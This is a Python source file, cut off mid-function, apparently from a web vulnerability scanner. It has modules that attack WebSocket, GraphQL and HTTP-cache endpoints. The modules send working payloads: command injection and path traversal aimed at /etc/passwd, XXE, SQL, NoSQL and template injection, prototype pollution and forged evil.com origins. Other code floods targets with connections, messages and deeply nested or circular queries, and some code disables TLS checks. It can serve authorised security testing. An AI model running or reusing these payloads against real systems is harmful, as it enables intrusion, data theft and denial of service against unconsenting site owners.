# ============================================================================
# WEBSOCKET SECURITY TESTER
# ============================================================================

import websockets
import asyncio
import json
import ssl
from typing import Dict, Any, List, Optional

class WebSocketTester:
    """Advanced WebSocket security testing"""
    
    def __init__(self, engine):
        self.engine = engine
        self.vulnerabilities = []
        
    async def test_websockets(self, endpoints: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Test WebSocket endpoints for security vulnerabilities"""
        print("  [+] Testing WebSocket security...")
        
        # Find WebSocket endpoints
        ws_endpoints = self._find_websocket_endpoints(endpoints)
        
        if not ws_endpoints:
            print("    [!] No WebSocket endpoints found")
            return []
        
        findings = []
        
        for ws_url in ws_endpoints:
            url_findings = await self.test_single_websocket(ws_url)
            findings.extend(url_findings)
        
        return findings
    
    def _find_websocket_endpoints(self, endpoints: List[Dict[str, Any]]) -> List[str]:
        """Find WebSocket endpoints from crawled data"""
        ws_endpoints = []
        patterns = [
            r'wss?://[^"\']+',
            r'new WebSocket\("([^"]+)"\)',
            r'new WebSocket\(\'([^\']+)\'\)',
            r'ws://',
            r'wss://',
            r'socket\.io'
        ]
        
        for endpoint in endpoints:
            # Check URL itself
            url = endpoint.get("url", "").lower()
            if url.startswith(("ws://", "wss://")):
                ws_endpoints.append(url)
            
            # Check in response content (would need to be stored)
            if endpoint.get("response_content"):
                content = endpoint["response_content"]
                for pattern in patterns:
                    matches = re.findall(pattern, content, re.IGNORECASE)
                    ws_endpoints.extend(matches)
        
        return list(set(ws_endpoints))[:10]  # Limit to 10 endpoints
    
    async def test_single_websocket(self, ws_url: str) -> List[Dict[str, Any]]:
        """Test a single WebSocket endpoint"""
        findings = []
        
        # Test 1: Connection without Origin header
        print(f"    [+] Testing: {ws_url}")
        
        # Test 2: Cross-Origin WebSocket Hijacking
        origin_finding = await self.test_cors_websocket(ws_url)
        if origin_finding:
            findings.append(origin_finding)
        
        # Test 3: Authentication bypass
        auth_finding = await self.test_auth_bypass(ws_url)
        if auth_finding:
            findings.append(auth_finding)
        
        # Test 4: Message injection
        injection_findings = await self.test_message_injection(ws_url)
        findings.extend(injection_findings)
        
        # Test 5: Denial of Service
        dos_finding = await self.test_websocket_dos(ws_url)
        if dos_finding:
            findings.append(dos_finding)
        
        return findings
    
    async def test_cors_websocket(self, ws_url: str) -> Optional[Dict[str, Any]]:
        """Test for Cross-Origin WebSocket Hijacking"""
        try:
            # Try to connect from malicious origin
            headers = {
                "Origin": "https://evil.com",
                "User-Agent": self.engine.config.user_agent
            }
            
            ssl_context = ssl.create_default_context()
            ssl_context.check_hostname = False
            ssl_context.verify_mode = ssl.CERT_NONE
            
            async with websockets.connect(
                ws_url,
                extra_headers=headers,
                ssl=ssl_context if ws_url.startswith("wss://") else None,
                timeout=10
            ) as websocket:
                # Send test message
                await websocket.send(json.dumps({"type": "ping"}))
                
                try:
                    response = await asyncio.wait_for(websocket.recv(), timeout=5)
                    
                    # If we get a response, WebSocket accepts cross-origin
                    return {
                        "title": "Cross-Origin WebSocket Hijacking",
                        "description": "WebSocket accepts connections from arbitrary origins",
                        "severity": "high",
                        "url": ws_url,
                        "evidence": f"Accepted connection from https://evil.com. Response: {response[:100]}",
                        "confidence": "medium"
                    }
                except asyncio.TimeoutError:
                    pass
                    
        except Exception as e:
            if "403" in str(e) or "401" in str(e):
                # Good - authentication required
                pass
            elif "origin" in str(e).lower():
                # Good - origin validation works
                pass
        
        return None
    
    async def test_auth_bypass(self, ws_url: str) -> Optional[Dict[str, Any]]:
        """Test WebSocket authentication bypass"""
        test_cases = [
            # No authentication
            {},
            # Malformed tokens
            {"Authorization": "Bearer invalid_token"},
            {"Authorization": "Bearer " + "A" * 500},  # Very long token
            # SQL injection in token
            {"Authorization": "Bearer ' OR '1'='1"},
            # JWT tampering
            {"Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"}
        ]
        
        for headers in test_cases:
            try:
                ssl_context = ssl.create_default_context()
                ssl_context.check_hostname = False
                ssl_context.verify_mode = ssl.CERT_NONE
                
                async with websockets.connect(
                    ws_url,
                    extra_headers=headers,
                    ssl=ssl_context if ws_url.startswith("wss://") else None,
                    timeout=10
                ) as websocket:
                    await websocket.send(json.dumps({"type": "auth_test"}))
                    
                    try:
                        response = await asyncio.wait_for(websocket.recv(), timeout=5)
                        
                        # If we get a valid response without proper auth
                        if "error" not in str(response).lower() and "unauth" not in str(response).lower():
                            return {
                                "title": "WebSocket Authentication Bypass",
                                "description": "WebSocket endpoint accessible without proper authentication",
                                "severity": "critical",
                                "url": ws_url,
                                "evidence": f"Connected with headers: {headers}. Response: {response[:100]}",
                                "confidence": "medium"
                            }
                    except asyncio.TimeoutError:
                        pass
                        
            except Exception as e:
                continue
        
        return None
    
    async def test_message_injection(self, ws_url: str) -> List[Dict[str, Any]]:
        """Test for WebSocket message injection vulnerabilities"""
        findings = []
        test_messages = [
            # JSON injection
            '{"__proto__": {"isAdmin": true}}',
            '{"constructor": {"prototype": {"isAdmin": true}}}',
            '{"$where": "1==1"}',
            
            # Command injection
            '{"command": "; ls -la"}',
            '{"cmd": "| cat /etc/passwd"}',
            '{"exec": "require(\'child_process\').exec(\'id\')"}',
            
            # XSS in WebSocket messages
            '{"message": "<script>alert(1)</script>"}',
            '{"html": "<img src=x onerror=alert(1)>"}',
            
            # Path traversal
            '{"file": "../../../etc/passwd"}',
            '{"path": "....//....//etc/passwd"}',
            
            # SQL injection
            '{"query": "\' OR 1=1--"}',
            '{"id": "1 UNION SELECT * FROM users"}',
            
            # NoSQL injection
            '{"$gt": ""}',
            '{"username": {"$ne": null}, "password": {"$ne": null}}',
            
            # SSTI
            '{"template": "{{7*7}}"}',
            '{"name": "${7*7}"}',
            
            # XXE (if XML is used)
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]<root>&test;</root>',
            
            # Prototype pollution
            '{"__proto__": {"polluted": "true"}}',
            '{"constructor": {"prototype": {"polluted": "true"}}}',
            
            # Large payloads for buffer overflow
            '{"data": "' + "A" * 10000 + '"}',
            '{"buffer": "' + "B" * 50000 + '"}'
        ]
        
        try:
            ssl_context = ssl.create_default_context()
            ssl_context.check_hostname = False
            ssl_context.verify_mode = ssl.CERT_NONE
            
            async with websockets.connect(
                ws_url,
                ssl=ssl_context if ws_url.startswith("wss://") else None,
                timeout=15
            ) as websocket:
                
                for i, message in enumerate(test_messages[:10]):  # Limit to 10 tests
                    try:
                        await websocket.send(message)
                        
                        try:
                            response = await asyncio.wait_for(websocket.recv(), timeout=3)
                            response_str = str(response)
                            
                            # Check for vulnerabilities in response
                            if "root:x:0:0:" in response_str:
                                findings.append({
                                    "title": "WebSocket File Disclosure",
                                    "description": "File disclosure via WebSocket message injection",
                                    "severity": "critical",
                                    "url": ws_url,
                                    "payload": message[:100] + "..." if len(message) > 100 else message,
                                    "evidence": "File contents returned in response",
                                    "confidence": "high"
                                })
                            
                            elif "49" in response_str and ("{{7*7}}" in message or "${7*7}" in message):
                                findings.append({
                                    "title": "WebSocket SSTI Injection",
                                    "description": "Server-Side Template Injection via WebSocket",
                                    "severity": "critical",
                                    "url": ws_url,
                                    "payload": message,
                                    "evidence": "Template expression evaluated (7*7=49)",
                                    "confidence": "high"
                                })
                            
                            elif any(error in response_str.lower() for error in 
                                   ["sql", "syntax", "mysql", "postgresql", "ora-"]):
                                findings.append({
                                    "title": "WebSocket SQL Injection",
                                    "description": "SQL injection via WebSocket message",
                                    "severity": "critical",
                                    "url": ws_url,
                                    "payload": message[:100] + "..." if len(message) > 100 else message,
                                    "evidence": "SQL error in response",
                                    "confidence": "medium"
                                })
                            
                            elif "error" in response_str.lower() and "stack" in response_str.lower():
                                findings.append({
                                    "title": "WebSocket Information Disclosure",
                                    "description": "Stack trace disclosure via WebSocket",
                                    "severity": "medium",
                                    "url": ws_url,
                                    "payload": message[:100] + "..." if len(message) > 100 else message,
                                    "evidence": "Stack trace in error response",
                                    "confidence": "high"
                                })
                        
                        except asyncio.TimeoutError:
                            # No response - might be okay
                            pass
                        
                    except Exception as e:
                        if "maximum message size" in str(e).lower():
                            findings.append({
                                "title": "WebSocket Message Size Limit",
                                "description": "WebSocket message size limit may be insufficient",
                                "severity": "low",
                                "url": ws_url,
                                "payload": f"Message of size {len(message)}",
                                "evidence": f"Error: {str(e)}",
                                "confidence": "medium"
                            })
                        continue
        
        except Exception as e:
            pass
        
        return findings
    
    async def test_websocket_dos(self, ws_url: str) -> Optional[Dict[str, Any]]:
        """Test WebSocket for Denial of Service vulnerabilities"""
        try:
            # Test rapid connection establishment
            connections = []
            start_time = time.time()
            
            for i in range(50):  # Try to create 50 concurrent connections
                try:
                    ssl_context = ssl.create_default_context()
                    ssl_context.check_hostname = False
                    ssl_context.verify_mode = ssl.CERT_NONE
                    
                    websocket = await websockets.connect(
                        ws_url,
                        ssl=ssl_context if ws_url.startswith("wss://") else None,
                        timeout=5
                    )
                    connections.append(websocket)
                    
                    # Send ping to keep connection alive
                    await websocket.send(json.dumps({"type": "ping", "id": i}))
                    
                except Exception:
                    break
            
            end_time = time.time()
            
            # Check how many connections succeeded
            if len(connections) >= 30:  # If we can make 30+ concurrent connections
                # Send flood of messages on one connection
                try:
                    if connections:
                        ws = connections[0]
                        flood_start = time.time()
                        
                        for i in range(1000):  # Send 1000 rapid messages
                            await ws.send(json.dumps({"flood": i, "data": "A" * 1000}))
                        
                        flood_end = time.time()
                        
                        # Clean up
                        for conn in connections:
                            await conn.close()
                        
                        return {
                            "title": "WebSocket Denial of Service Vulnerability",
                            "description": "WebSocket vulnerable to connection/message flooding",
                            "severity": "medium",
                            "url": ws_url,
                            "evidence": f"Established {len(connections)} concurrent connections. Sent 1000 messages in {flood_end - flood_start:.2f}s",
                            "confidence": "medium"
                        }
                
                except Exception:
                    pass
            
            # Clean up
            for conn in connections:
                try:
                    await conn.close()
                except:
                    pass
        
        except Exception as e:
            pass
        
        return None

# ============================================================================
# GRAPHQL EXPLOITATION MODULE
# ============================================================================

class GraphQLExploiter:
    """Advanced GraphQL security testing and exploitation"""
    
    def __init__(self, engine):
        self.engine = engine
        self.introspection_queries = self._load_introspection_queries()
        
    def _load_introspection_queries(self) -> Dict[str, str]:
        """Load GraphQL introspection queries"""
        return {
            "full_introspection": """
                query IntrospectionQuery {
                  __schema {
                    queryType { name }
                    mutationType { name }
                    subscriptionType { name }
                    types {
                      ...FullType
                    }
                    directives {
                      name
                      description
                      locations
                      args {
                        ...InputValue
                      }
                    }
                  }
                }
                
                fragment FullType on __Type {
                  kind
                  name
                  description
                  fields(includeDeprecated: true) {
                    name
                    description
                    args {
                      ...InputValue
                    }
                    type {
                      ...TypeRef
                    }
                    isDeprecated
                    deprecationReason
                  }
                  inputFields {
                    ...InputValue
                  }
                  interfaces {
                    ...TypeRef
                  }
                  enumValues(includeDeprecated: true) {
                    name
                    description
                    isDeprecated
                    deprecationReason
                  }
                  possibleTypes {
                    ...TypeRef
                  }
                }
                
                fragment InputValue on __InputValue {
                  name
                  description
                  type {
                    ...TypeRef
                  }
                  defaultValue
                }
                
                fragment TypeRef on __Type {
                  kind
                  name
                  ofType {
                    kind
                    name
                    ofType {
                      kind
                      name
                      ofType {
                        kind
                        name
                        ofType {
                          kind
                          name
                          ofType {
                            kind
                            name
                            ofType {
                              kind
                              name
                              ofType {
                                kind
                                name
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
            """,
            
            "simple_introspection": """
                query {
                  __schema {
                    types {
                      name
                      fields {
                        name
                      }
                    }
                  }
                }
            """,
            
            "mutations_introspection": """
                query {
                  __schema {
                    mutationType {
                      fields {
                        name
                        args {
                          name
                          type {
                            name
                          }
                        }
                      }
                    }
                  }
                }
            """
        }
    
    async def exploit_graphql(self, endpoints: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Exploit GraphQL endpoints for security vulnerabilities"""
        print("  [+] Testing GraphQL security...")
        
        # Find GraphQL endpoints
        graphql_endpoints = []
        for endpoint in endpoints:
            url = endpoint.get("url", "").lower()
            if any(keyword in url for keyword in ["/graphql", "/gql", "/query", "/graphiql"]):
                graphql_endpoints.append(endpoint["url"])
            elif endpoint.get("response_content") and "graphql" in endpoint["response_content"].lower():
                # Try common GraphQL paths
                base_url = endpoint["url"].split("?")[0]
                for path in ["/graphql", "/api/graphql", "/v1/graphql", "/graphql/api"]:
                    graphql_endpoints.append(f"{base_url.rstrip('/')}{path}")
        
        if not graphql_endpoints:
            print("    [!] No GraphQL endpoints found")
            return []
        
        findings = []
        
        for endpoint in graphql_endpoints[:5]:  # Limit to 5 endpoints
            endpoint_findings = await self.test_graphql_endpoint(endpoint)
            findings.extend(endpoint_findings)
        
        return findings
    
    async def test_graphql_endpoint(self, url: str) -> List[Dict[str, Any]]:
        """Test a single GraphQL endpoint"""
        findings = []
        
        print(f"    [+] Testing GraphQL: {url}")
        
        # Test 1: Introspection enabled
        introspection_findings = await self.test_introspection(url)
        findings.extend(introspection_findings)
        
        # Test 2: Batching attacks
        batching_findings = await self.test_batching_attacks(url)
        findings.extend(batching_findings)
        
        # Test 3: Denial of Service
        dos_findings = await self.test_graphql_dos(url)
        findings.extend(dos_findings)
        
        # Test 4: Field suggestions
        field_suggestion_findings = await self.test_field_suggestions(url)
        findings.extend(field_suggestion_findings)
        
        # Test 5: SQL injection via GraphQL
        sql_findings = await self.test_graphql_sql_injection(url)
        findings.extend(sql_findings)
        
        # Test 6: NoSQL injection
        nosql_findings = await self.test_graphql_nosql_injection(url)
        findings.extend(nosql_findings)
        
        return findings
    
    async def test_introspection(self, url: str) -> List[Dict[str, Any]]:
        """Test if GraphQL introspection is enabled"""
        findings = []
        
        for name, query in self.introspection_queries.items():
            try:
                payload = {"query": query}
                
                async with self.engine.session.post(
                    url,
                    json=payload,
                    headers={"Content-Type": "application/json"},
                    timeout=10
                ) as response:
                    
                    if response.status == 200:
                        data = await response.json()
                        
                        if "data" in data and "__schema" in data["data"]:
                            findings.append({
                                "title": "GraphQL Introspection Enabled",
                                "description": f"GraphQL introspection query '{name}' is accessible",
                                "severity": "medium",
                                "url": url,
                                "evidence": f"Introspection query '{name}' returned schema data",
                                "confidence": "high"
                            })
                            
                            # Extract sensitive information from schema
                            schema_info = self.analyze_schema(data["data"]["__schema"])
                            if schema_info.get("sensitive_fields"):
                                findings.append({
                                    "title": "GraphQL Sensitive Data Exposure",
                                    "description": "GraphQL schema reveals sensitive field names",
                                    "severity": "low",
                                    "url": url,
                                    "evidence": f"Sensitive fields found: {', '.join(schema_info['sensitive_fields'][:5])}",
                                    "confidence": "high"
                                })
                            
                            break  # Found introspection, no need to test other queries
                    
                    elif response.status == 400 and "introspection" in (await response.text()).lower():
                        # Introspection disabled with error message
                        pass
            
            except Exception as e:
                continue
        
        return findings
    
    def analyze_schema(self, schema: Dict[str, Any]) -> Dict[str, Any]:
        """Analyze GraphQL schema for sensitive information"""
        sensitive_keywords = [
            "password", "secret", "key", "token", "auth", "credential",
            "admin", "user", "email", "phone", "ssn", "credit",
            "private", "internal", "hidden", "sensitive"
        ]
        
        sensitive_fields = []
        types = schema.get("types", [])
        
        for type_info in types:
            type_name = type_info.get("name", "").lower()
            fields = type_info.get("fields", [])
            
            # Check type name
            for keyword in sensitive_keywords:
                if keyword in type_name and type_name not in ["query", "mutation", "subscription"]:
                    sensitive_fields.append(f"Type: {type_info.get('name')}")
                    break
            
            # Check field names
            for field in fields:
                field_name = field.get("name", "").lower()
                for keyword in sensitive_keywords:
                    if keyword in field_name:
                        sensitive_fields.append(f"{type_info.get('name')}.{field.get('name')}")
                        break
        
        return {
            "sensitive_fields": list(set(sensitive_fields)),
            "total_types": len(types)
        }
    
    async def test_batching_attacks(self, url: str) -> List[Dict[str, Any]]:
        """Test for GraphQL batching/alias attacks"""
        findings = []
        
        # Test alias-based brute force
        alias_query = "query {"
        for i in range(100):
            alias_query += f'user{i}: __typename\n'
        alias_query += "}"
        
        try:
            async with self.engine.session.post(
                url,
                json={"query": alias_query},
                headers={"Content-Type": "application/json"},
                timeout=15
            ) as response:
                
                if response.status == 200:
                    data = await response.json()
                    
                    if "data" in data:
                        # Count successful aliases
                        success_count = len([k for k in data["data"].keys() if data["data"][k] is not None])
                        
                        if success_count >= 50:
                            findings.append({
                                "title": "GraphQL Alias Overloading",
                                "description": "GraphQL accepts excessive field aliases",
                                "severity": "low",
                                "url": url,
                                "evidence": f"Successfully processed {success_count} aliases in single query",
                                "confidence": "high"
                            })
        
        except Exception as e:
            pass
        
        # Test query batching (multiple queries in one request)
        batched_queries = []
        for i in range(20):
            batched_queries.append({"query": "query { __typename }"})
        
        try:
            async with self.engine.session.post(
                url,
                json=batched_queries,  # Send as array
                headers={"Content-Type": "application/json"},
                timeout=15
            ) as response:
                
                if response.status == 200:
                    data = await response.json()
                    
                    if isinstance(data, list) and len(data) == 20:
                        findings.append({
                            "title": "GraphQL Batch Query Vulnerability",
                            "description": "GraphQL accepts batched queries (array of queries)",
                            "severity": "medium",
                            "url": url,
                            "evidence": "Processed 20 batched queries in single request",
                            "confidence": "high"
                        })
        
        except Exception as e:
            pass
        
        return findings
    
    async def test_graphql_dos(self, url: str) -> List[Dict[str, Any]]:
        """Test GraphQL for Denial of Service vulnerabilities"""
        findings = []
        
        # Test 1: Deep nested query
        deep_query = self._generate_deep_nested_query(50)
        
        try:
            start_time = time.time()
            
            async with self.engine.session.post(
                url,
                json={"query": deep_query},
                headers={"Content-Type": "application/json"},
                timeout=30
            ) as response:
                
                response_time = time.time() - start_time
                
                if response.status == 200:
                    if response_time > 10:  # Took more than 10 seconds
                        findings.append({
                            "title": "GraphQL Deep Query DoS",
                            "description": "Deeply nested queries cause slow response",
                            "severity": "medium",
                            "url": url,
                            "evidence": f"Deep query took {response_time:.2f}s to respond",
                            "confidence": "medium"
                        })
        
        except asyncio.TimeoutError:
            findings.append({
                "title": "GraphQL Query Timeout DoS",
                "description": "GraphQL query causes timeout",
                "severity": "medium",
                "url": url,
                "evidence": "Deep nested query timed out after 30 seconds",
                "confidence": "high"
            })
        
        except Exception as e:
            pass
        
        # Test 2: Circular fragment reference
        circular_query = """
            query {
              ...FragmentA
            }
            
            fragment FragmentA on Query {
              ...FragmentB
            }
            
            fragment FragmentB on Query {
              ...FragmentA
            }
        """
        
        try:
            async with self.engine.session.post(
                url,
                json={"query": circular_query},
                headers={"Content-Type": "application/json"},
                timeout=10
            ) as response:
                
                if response.status == 400:
                    # Expected - circular fragments should be rejected
                    pass
                elif response.status == 200:
                    findings.append({
                        "title": "GraphQL Circular Fragment DoS",
                        "description": "GraphQL accepts circular fragment references",
                        "severity": "high",
                        "url": url,
                        "evidence": "Circular fragment query accepted (potential infinite recursion)",
                        "confidence": "medium"
                    })
        
        except Exception as e:
            pass
        
        # Test 3: Field duplication attack
        field_duplication_query = "query {"
        for i in range(1000):
            field_duplication_query += "  __typename\n"
        field_duplication_query += "}"
        
        try:
            start_time = time.time()
            
            async with self.engine.session.post(
                url,
                json={"query": field_duplication_query},
                headers={"Content-Type": "application/json"},
                timeout=15
            ) as response:
                
                response_time = time.time() - start_time
                
                if response.status == 200:
                    data = await response.json()
                    if "errors" not in data:
                        findings.append({
                            "title": "GraphQL Field Duplication DoS",
                            "description": "GraphQL accepts queries with excessive field duplication",
                            "severity": "low",
                            "url": url,
                            "evidence": f"Processed 1000 duplicate fields in {response_time:.2f}s",
                            "confidence": "medium"
                        })
        
        except Exception as e:
            pass
        
        return findings
    
    def _generate_deep_nested_query(self, depth: int) -> str:
        """Generate a deeply nested GraphQL query"""
        query = "query {"
        for i in range(depth):
            query += " user {"
        query += " __typename"
        query += " }" * depth
        query += " }"
        return query
    
    async def test_field_suggestions(self, url: str) -> List[Dict[str, Any]]:
        """Test GraphQL field suggestion/autocomplete features"""
        findings = []
        
        # Try to brute force field names
        common_fields = [
            "users", "user", "posts", "post", "comments", "comment",
            "products", "product", "orders", "order", "settings",
            "config", "configuration", "admin", "administrator",
            "auth", "authentication", "login", "logout", "register",
            "profile", "account", "password", "email", "phone"
        ]
        
        successful_fields = []
        
        for field in common_fields:
            query = f"query {{ {field} {{ __typename }} }}"
            
            try:
                async with self.engine.session.post(
                    url,
                    json={"query": query},
                    headers={"Content-Type": "application/json"},
                    timeout=5
                ) as response:
                    
                    if response.status == 200:
                        data = await response.json()
                        
                        if "errors" not in data and data.get("data", {}).get(field) is not None:
                            successful_fields.append(field)
            
            except Exception as e:
                continue
        
        if successful_fields:
            findings.append({
                "title": "GraphQL Field Enumeration",
                "description": "GraphQL fields can be enumerated via brute force",
                "severity": "low",
                "url": url,
                "evidence": f"Discovered fields: {', '.join(successful_fields[:10])}",
                "confidence": "medium"
            })
        
        return findings
    
    async def test_graphql_sql_injection(self, url: str) -> List[Dict[str, Any]]:
        """Test for SQL injection in GraphQL queries"""
        findings = []
        
        # Test in arguments
        sql_test_queries = [
            # Numeric ID injection
            ('query { user(id: "1") { id name } }', 'query { user(id: "1 OR 1=1") { id name } }'),
            # String injection
            ('query { search(query: "test") { id } }', 'query { search(query: "test\' OR \'1\'=\'1") { id } }'),
            # Filter injection
            ('query { users(filter: {name: "test"}) { id } }', 'query { users(filter: {name: "test\'}) { id } }'),
        ]
        
        for normal_query, sql_query in sql_test_queries:
            try:
                # First send normal query
                async with self.engine.session.post(
                    url,
                    json={"query": normal_query},
                    headers={"Content-Type": "application/json"},
                    timeout=5
                ) as normal_response:
                    
                    if normal_response.status == 200:
                        normal_data = await normal_response.json()
                        
                        # Then send SQL injection attempt
                        async with self.engine.session.post(
                            url,
                            json={"query": sql_query},
                            headers={"Content-Type": "application/json"},
                            timeout=5
                        ) as sql_response:
                            
                            if sql_response.status == 200:
                                sql_data = await sql_response.json()
                                
                                # Compare responses
                                if "errors" in sql_data:
                                    errors = str(sql_data["errors"]).lower()
                                    if any(sql_indicator in errors for sql_indicator in 
                                          ["sql", "syntax", "mysql", "postgres", "ora-"]):
                                        findings.append({
                                            "title": "GraphQL SQL Injection",
                                            "description": "SQL injection via GraphQL arguments",
                                            "severity": "critical",
                                            "url": url,
                                            "evidence": f"SQL error in response: {errors[:200]}",
                                            "confidence": "high"
                                        })
                
            except Exception as e:
                continue
        
        return findings
    
    async def test_graphql_nosql_injection(self, url: str) -> List[Dict[str, Any]]:
        """Test for NoSQL injection in GraphQL"""
        findings = []
        
        nosql_payloads = [
            # MongoDB injection
            '{"$ne": null}',
            '{"$gt": ""}',
            '{"$where": "1==1"}',
            
            # Operator injection
            '{"$regex": ".*"}',
            '{"$exists": true}',
            
            # JavaScript injection
            '{"$function": "function() { return true; }"}'
        ]
        
        # Try to inject in filter arguments
        for payload in nosql_payloads:
            query = f'query {{ users(filter: {payload}) {{ id name }} }}'
            
            try:
                async with self.engine.session.post(
                    url,
                    json={"query": query},
                    headers={"Content-Type": "application/json"},
                    timeout=5
                ) as response:
                    
                    if response.status == 200:
                        data = await response.json()
                        
                        if "data" in data and data["data"].get("users"):
                            # Got data back - might be vulnerable
                            findings.append({
                                "title": "GraphQL NoSQL Injection",
                                "description": "NoSQL injection via GraphQL filter arguments",
                                "severity": "critical",
                                "url": url,
                                "evidence": f"Query with payload {payload} returned data",
                                "confidence": "medium"
                            })
                            break
            
            except Exception as e:
                continue
        
        return findings

# ============================================================================
# WEB CACHE POISONING MODULE
# ============================================================================

class WebCachePoisoningTester:
    """Web Cache Poisoning testing module"""
    
    def __init__(self, engine):
        self.engine = engine
        self.cache_indicators = [
            "cache-control", "age", "x-cache", "cf-cache-status",
            "fastly-restarts", "akamai-cache", "x-varnish"
        ]
    
    async def test_cache_poisoning(self, endpoints: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Test for web cache poisoning vulnerabilities"""
        print("  [+] Testing Web Cache Poisoning...")
        
        findings = []
        
        # Test key endpoints
        test_endpoints = endpoints[:20]  # Limit to 20 endpoints
        
        for endpoint in test_endpoints:
            url = endpoint["url"]
            
            # Check if endpoint is cacheable
            cacheable = await self.is_cacheable(url)
            
            if cacheable:
                endpoint_findings = await self.test_cache_poisoning_vectors(url)
                findings.extend(endpoint_findings)
        
        return findings
    
    async def is_cacheable(self, url: str) -> bool:
        """Check if a URL is cacheable"""
        try:
            async with self.engine.session.head(url, allow_redirects=True) as response:
                headers = response.headers
                
                # Check cache headers
                cache_control = headers.get("cache-control", "").lower()
                
                # Check for cache indicators
                for indicator in self.cache_indicators:
                    if indicator in headers:
                        return True
                
                # Check Cache-Control directives
                if "public" in cache_control and "no-store" not in cache_control:
                    return True
                
                # Check for max-age
                if "max-age" in cache_control:
                    return True
                
                # Check for Expires header
                if "expires" in headers:
                    return True
        
        except Exception as e:
            pass
        
        return False
    
    async def test_cache_poisoning_vectors(self, url: str) -> List[Dict[str, Any]]:
        """Test various cache poisoning vectors"""
        findings = []
        
        print(f"    [+] Testing cache poisoning: {url}")
        
        # Test 1: Unkeyed headers
        unkeyed_findings = await self.test_unkeyed_headers(url)
        findings.extend(unkeyed_findings)
        
        # Test 2: HTTP Parameter Pollution (HPP)
        hpp_findings = await self.test_http_parameter_pollution(url)
        findings.extend(hpp_findings)
        
        # Test 3: Cache key normalization
        normalization_findings = await self.test_cache_key_normalization(url)
        findings.extend(normalization_findings)
        
        # Test 4: X-Forwarded-Host poisoning
        xfh_findings = await self.test_x_forwarded_host(url)
        findings.extend(xfh_findings)
        
        # Test 5: Cache deception
        deception_findings = await self.test_cache_deception(url)
        findings.extend(deception_findings)
        
        return findings
    
    async def test_unkeyed_headers(self, url: str) -> List[Dict[str, Any]]:
        """Test for unkeyed headers in cache key"""
        findings = []
        
        test_headers = [
            ("X-Forwarded-Host", "evil.com"),
            ("X-Forwarded-Scheme", "http"),
            ("X-Forwarded-Port", "80"),
            ("X-Original-URL", "/evil"),
            ("X-Rewrite-URL", "/evil"),
            ("X-Forwarded-For", "127.0.0.1"),
            ("X-Real-IP", "127.0.0.1"),
            ("X-Host", "evil.com"),
            ("Host", "evil.com"),
            ("Origin", "https://evil.com"),
            ("Referer", "https://evil.com"),
            ("User-Agent", "Mozilla/5.0 (Evil Browser)"),
            ("Accept-Language", "en-US,en;q=0.9"),
            ("Accept-Encoding", "gzip, deflate, br")
        ]
        
        # First get normal response
        try:
            normal_response = await self.engine.session.get(url)
            normal_body = await normal_response.text()
            normal_headers = dict(normal_response.headers)
        except:
            return findings
        
        for header_name, header_value in test_headers:
            try:
                headers = {header_name: header_value}
                
                # Make request with test header
                async with self.engine.session.get(url, headers=headers) as response:
                    poisoned_body = await response.text()
                    poisoned_headers = dict(response.headers)
                    
                    # Check if response differs
                    if poisoned_body != normal_body:
                        # Check cache headers
                        cache_status = poisoned_headers.get("x-cache", poisoned_headers.get("cf-cache-status", ""))
                        
                        findings.append({
                            "title": "Cache Poisoning via Unkeyed Header",
                            "description": f"Header '{header_name}' is not included in cache key",
                            "severity": "high",
                            "url": url,
                            "header": f"{header_name}: {header_value}",
                            "evidence": f"Response differs when {header_name} is set. Cache: {cache_status}",
                            "confidence": "medium"
                        })
                    
                    # Also check if header is reflected
                    if header_value in poisoned_body:
                        findings.append({
                            "title": "Header Reflection with Cache Poisoning",
                            "description": f"Header '{header_name}' is reflected in response",
                            "severity": "critical",
                            "url": url,
                            "header": f"{header_name}: {header_value}",
                            "evidence": f"Header value '{header_value}' reflected in response body",
                            "confidence": "high"
                        })
            
            except Exception as e:
                continue
        
        return findings
    
    async def test_http_parameter_pollution(self, url: str) -> List[Dict[str, Any]]:
        """Test HTTP Parameter Pollution for cache poisoning"""
        findings = []
        
        # Parse URL
        parsed = urlparse(url)
        query = parsed.query
        
        if not query:
            # Add a test parameter
            test_url = f"{url}?test=1"
        else:
            test_url = url
        
        # Test parameter duplication
        test_cases = [
            ("?param=good&param=evil", "Duplicate parameters with different values"),
            ("?param[]=good&param[]=evil", "Array parameter pollution"),
            ("?param=good%26param%3Devil", "URL-encoded parameter injection"),
        ]
        
        for test_query, description in test_cases:
            try:
                if "?" in test_url:
                    test_url_modified = test_url.split("?")[0] + test_query
                else:
                    test_url_modified = test_url + test_query
                
                async with self.engine.session.get(test_url_modified) as response:
                    body = await response.text()
                    
                    # Check for parameter reflection
                    if "evil" in body.lower() or "param=evil" in body:
                        findings.append({
                            "title": "HTTP Parameter Pollution (HPP)",
                            "description": description,
                            "severity": "medium",
                            "url": test_url_modified,
                            "evidence": "Malicious parameter value reflected in response",
                            "confidence": "medium"
                        })
            
            except Exception as e:
                continue
        
        return findings
    
    async def test_cache_key_normalization(self, url: str) -> List[Dict[str, Any]]:
        """Test cache key normalization issues"""
        findings = []
        
        # Test various URL variations that might have same cache key
        variations = [
            f"{url}?",  # Trailing question mark
            f"{url}#",  # Trailing hash
            f"{url}?param",  # Parameter without value
            f"{url}?param=",  # Empty parameter value
            f"{url}?a=1&b=2",  # Different parameter order
            f"{url}?b=2&a=1",  # Reversed parameter order
            f"{url}?A=1",  # Different case parameter
            f"{url}?a=1&a=1",  # Duplicate parameters
        ]
        
        # Get baseline response
        try:
            baseline_response = await self.engine.session.get(url)
            baseline_body = await baseline_response.text()
        except:
            return findings
        
        for variation in variations:
            try:
                async with self.engine.session.get(variation) as response:
                    variation_body = await response.text()
                    variation_headers = dict(response.headers)
                    
                    # Check cache status
                    cache_status = variation_headers.get("x-cache", variation_headers.get("cf-cache-status", ""))
                    
                    if "HIT" in cache_status.upper() and variation_body == baseline_body:
                        findings.append({
                            "title": "Cache Key Normalization Issue",
                            "description": f"URL variation returns cached response",
                            "severity": "medium",
                            "url": variation,
